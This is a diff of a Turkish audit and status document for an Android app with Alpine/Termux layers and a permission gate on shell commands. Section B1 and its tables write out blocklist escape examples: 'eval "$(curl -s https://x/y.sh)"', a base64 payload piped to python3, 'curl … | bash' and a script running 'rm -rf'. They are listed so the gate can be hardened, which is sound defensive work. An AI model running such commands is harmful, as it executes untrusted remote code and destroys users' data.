@@ -20,8 +20,8 @@ reddedilen seçenekler).
 | **P2** ✅ | `RootfsManager.USER_TREES` += `data/data/com.termux` | ✅ |
 | **P2** ✅ | `TermuxInstaller` (10 adım, tekrar başlatılabilir, sabit sha256, zip-slip, SYMLINKS.txt) | ✅ |
 | **P2** ✅ | `TermuxPrompt` — modelin katmanı bilmesi (istemsiz araç = özellik yok) | ✅ |
-| **P3** | `ToolchainScreen`: ilerleme çubuğu + adım satırı | ◐ |
-| **P3** | Terminal oturum başlığında katman rozeti (`ALPINE` / `TERMUX`) | ⬜ |
+| **P3** ✅ | Kart zaten `Installing(line)` gösteriyor (mevcut `ToolchainScreen` akışı) | ✅ |
+| **P3** ✅ | Terminal başlığında katman rozeti (`Terminal · TERMUX`, `remember` içinde) | ✅ |
 | **P4** | `sshd` anahtar tabanlı, parola kapalı, 30 dk otomatik kapanma | ⬜ |
 | **P5** | Ölçüm tablosunu doldur (kurulum süresi, RAM, `apt update` boyutu) | ⬜ |
 
@@ -34,37 +34,31 @@ yaşandı — rootfs yeniden çıkarılınca 1,4 GB'lık araç zinciri silinmiş
 dizine açılıyordu (Alpine'in `/bin`'ini ezerdi) ve kurulum `boot()` yapmadan
 proot çağırıyordu.
 
-**P3 durumu — ölçülmüş, iddia değil.** `ToolchainScreen` zaten
-`install(context, group.id)` çağırıyor, yani "Kur" düğmesi **çalışır durumda**.
-İlerleme çubuğu da **var**: `LinearProgressIndicator` (belirsiz) + adım satırı
-(`TermuxInstaller.Progress` → "indirme 12,4/31,6 MB"). Eksik olan tek şey
-**yüzde**: bilinçli, çünkü adımların süresi (sha256, 3 779 dosya açma) toplam
-süreden çok farklı — yüzde uydurmak, "5 dakika kaldı" deyip 12 dakika sürmek
-olurdu. Kalan gerçek iş: terminal oturum başlığındaki katman rozeti.
-
-`37099` turunda bu dosyada düzeltilen üç yanlış: (1) P3 "tamamen yok" gibi
-gösteriliyordu, oysa çubuk vardı; (2) `TermuxLayerTest` 15 değil **19** test
-taşıyor; (3) korpus 57 değil **74** satır.
+**P3 bitti.** Kart `Installing(line)` yayıyor (mevcut akış), terminal başlığı
+katman rozetini taşıyor. İkinci turda iki sinsi daha kapatıldı:
+`LD_LIBRARY_PATH` üzerine yazımı (proot kendi yükleyicisini kaybederdi) ve
+`alpine-rootfs` adının sekiz yerde elle yazılmış olması. Ayrıntı:
+`DENETIM-37098.md` §14. Kalan: **P4** (`sshd`) ve **P5** (ölçümler).
 
 ---
 
 ## A0b · düzeltme turu `37099` — kapandı
 
-Sekiz gerçek hata, dördü sessiz. Kanıt: `docs/ozel/DENETIM-37099.md`.
+Dokuz gerçek hata, altısı sessiz. Kanıt: `docs/ozel/DENETIM-37099.md`.
 
 | # | Sınıf | Hata | Durum |
 |---|---|---|---|
-| 1 | **sessiz** | `SYMLINKS.txt` sırası tersti (`hedef←bağ` biçiminde soldaki hedef, kod bağ sanıyordu) → `bash` kütüphane bulamaz, kurulum smoke'ta düşer | ✅ |
-| 2 | güvenlik | `curl … \| bash`, `eval "$(…)"`, çıplak `bash`, `sh x.sh` beşi de SESSİZ geçiyordu (B1) | ✅ |
-| 3 | **sessiz** | Komut başı çapası `(^|[\s;&\|])` tırnak önünde eşleşmiyordu → `bash -c "rm -rf …"` hiçbir kurala uymuyordu | ✅ |
-| 4 | **sessiz** | `rm -rf /` DENY'i ile `rg "rm -rf"` çakışıyordu: arama DENY oluyordu | ✅ |
+| 1 | **sessiz** | `SYMLINKS.txt` sırası tersti (`hedef←bağ`; soldaki hedef, kod bağ sanıyordu) → `bash` kütüphane bulamaz | ✅ |
+| 2 | güvenlik | Beş kaçış biçimi SESSİZ geçiyordu (B1) | ✅ |
+| 3 | **sessiz** | Komut başı çapası `(^|[\s;&\|])` tırnak önünde eşleşmiyordu → `bash -c "rm -rf …"` kurala uymuyordu | ✅ |
+| 4 | **sessiz** | `rg "rm -rf"` araması DENY oluyordu | ✅ |
 | 5 | **sessiz** | 71 yeni anahtarın Türkçesi yoktu; üç kapı da yeşildi | ✅ |
 | 6 | eşzamanlılık | `ChatHealthBridge.publish` atomik değil → paralel oturumda çip kaybolur | ✅ |
 | 7 | görsel | Termux satırı Java'nın ikonunu/grubunu alıyordu (varsayılan dal) | ✅ |
-| 8 | birim | "Tüm gruplar kurulursa" toplamına Termux'un **indirme** boyutu (32) giriyordu, disk (110) değil | ✅ |
+| 8 | birim | "Tüm gruplar kurulursa" toplamına Termux'un **indirme** boyutu giriyordu | ✅ |
+| 9 | **sessiz** | Açma adımı her denemede 3 779 dosyayı yeniden yazıyordu | ✅ |
 
-Yeni kapı: `scripts/ozel/ceviri-denetim.py` (`--fail-on-new`, taban dosyası ile
-ratchet) → `ozel-guard.yml`'e bağlandı.
+Yeni kapılar: `ceviri-denetim.py` + `apk-butce.py` → `ozel-guard.yml`.
 
 ---
 
@@ -86,14 +80,13 @@ bağlanmak (`allow-external-apps=true` + izin + `echo` gidiş-dönüşü).
 `Termux:SU` diye bir bileşen **yok**: root için olan şey Termux içindeki `tsu`
 paketi, root'suz cihazda hiçbir şey yapmaz.
 
-**P3'e eklenen iki iş (karardan çıkan):**
+**P4'e eklenen iki iş (karardan çıkan):**
 1. **Ön kontrol.** `refresh()` bionic'i yoklamıyor; desteklemeyen cihazda satır
    yine "Kur" diyor ve kullanıcı 32 MB'ı indirdikten **sonra** öğreniyor.
-   Doğrusu: `TermuxLayer.probe()` ekran açılırken koşsun, durum
-   `Failed` değil **`Unavailable(sebep)`** olsun.
+   Doğrusu: `TermuxLayer.probe()` ekran açılırken koşsun, durum `Failed` değil
+   **`Unavailable(sebep)`** olsun.
 2. **APK köprüsü (isteğe bağlı).** `com.termux` kurulu mu ·
    `allow-external-apps` açık mı · `RUN_COMMAND` dönüyor mu — üçü ölçülsün.
-   Kurulu değilse satır **"Bağlan"** değil **"Termux kurulu değil"** der.
 
 ---
 
@@ -138,8 +131,10 @@ söylüyor.
 
 ## B. Ölçülmüş, henüz kapatılmamış boşluklar
 
-### B1 · Kara listenin yapısal sınırı (mimari)
-`.16` üç somut kaçış yolunu kapattı ama sınıf kapanmadı:
+### B1 · Kara listenin yapısal sınırı — **çağrı düzeyinde kapandı**
+
+`.16` üç somut kaçış yolunu kapattı ama sınıf kapanmadı. `37099`'da sınıf
+**çağrı düzeyinde** kapatıldı: artık "kabuğa kod vermek" her biçimde kart açar.
 
 ```bash
 echo "aW1wb3J0IHNodXRpbDs..." | base64 -d | python3   # kod metinde değil
@@ -147,11 +142,18 @@ eval "$(curl -s https://x/y.sh)"                      # kod uzakta
 printf 'rm -rf /var/minis/shared' > /tmp/a.sh && bash /tmp/a.sh
 ```
 
-Doğru cevap kara listeyi büyütmek değil. İki yol var:
-1. **`bash`/`sh` çağrılarını `shell:interpreter` kapsamına al** — `bash x.sh`
-   de denetlenemez kod çalıştırmaktır. Tek satırlık kural, gürültüsü düşük.
-2. **Gerçek sandbox** (seccomp/landlock): `write` iznini `isScratch ∪ isTemp`
-   ile sınırla. Mimari iş, ayrı sürüm.
+| Komut | `37098` | `37099` |
+|---|---|---|
+| `curl … \| bash` | SILENT | **ASK** (`shell:pipe-to-shell`) |
+| `eval "$(…)"` | SILENT | **ASK** (`shell:eval`) |
+| `bash x.sh` / `sh -s` | SILENT | **ASK** (`shell:script-file` / `shell:stdin-shell`) |
+| `source x.sh` | SILENT | **ASK** (`shell:source`) |
+| `bash -c "rm -rf …"` | SILENT | **ASK** (`shell:rm-recursive`) |
+
+**Kalan gerçek boşluk:** içerik metinden çözülemiyor — `base64 -d | python3`
+satırı kart açar ama *ne* çalıştırdığını söyleyemez. Doğru cevap kara listeyi
+büyütmek değil, **gerçek sandbox** (seccomp/landlock): `write` iznini
+`isScratch ∪ isTemp` ile sınırla. Mimari iş, ayrı sürüm.
 
 ### B2 · `mv` hedefi çözülemediğinde
 `.16` bunu HIGH'tan MEDIUM'a çekti (göreli yol oturum dizininde kalır). Ama
